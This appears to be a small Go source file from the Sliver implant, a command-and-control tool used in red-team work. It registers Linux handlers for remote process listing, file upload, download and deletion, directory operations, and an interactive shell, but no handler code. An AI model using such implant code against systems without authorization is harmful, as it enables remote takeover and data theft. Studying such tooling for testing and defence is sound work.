package main

import pb "sliver/protobuf/sliver"

var (
	linuxHandlers = map[uint32]RPCHandler{

		pb.MsgPsListReq:   psHandler,
		pb.MsgPing:        pingHandler,
		pb.MsgKill:        killHandler,
		pb.MsgDirListReq:  dirListHandler,
		pb.MsgDownloadReq: downloadHandler,
		pb.MsgUploadReq:   uploadHandler,
		pb.MsgCdReq:       cdHandler,
		pb.MsgPwdReq:      pwdHandler,
		pb.MsgRmReq:       rmHandler,
		pb.MsgMkdirReq:    mkdirHandler,

		pb.MsgShellReq:  startShellHandler,
		pb.MsgShellData: shellDataHandler,
	}
)

func getSystemHandlers() map[uint32]RPCHandler {
	return linuxHandlers
}
